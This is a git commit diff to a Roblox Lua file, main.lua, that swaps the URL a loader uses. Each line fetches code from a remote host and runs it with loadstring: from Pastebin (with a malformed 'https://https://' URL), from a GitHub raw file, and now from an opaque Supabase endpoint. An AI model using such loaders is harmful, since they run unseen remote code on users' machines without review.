86cfb80a5c9bad6e0fcfdc66119a5dd51e6a1c6a
waealbert4-lab <waealbert4@gmail.com>
2026-03-16 16:01:30 -0700

    Update URL for loading script in main.lua

--- main.lua
+++ main.lua
@@ -1,2 +1,2 @@
 task.spawn(function() loadstring(game:HttpGet("https://https://pastebin.com/L3bCY4iL"))() end)
-task.spawn(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/waealbert4-lab/nine/refs/heads/main/main.lua"))() end)
+task.spawn(function() loadstring(game:HttpGet("https://msuelcjkfclhrnwuywte.supabase.co/functions/v1/get-paste?id=42420291-7eee-48bb-ad95-6b7a91ce4dca"))() end)
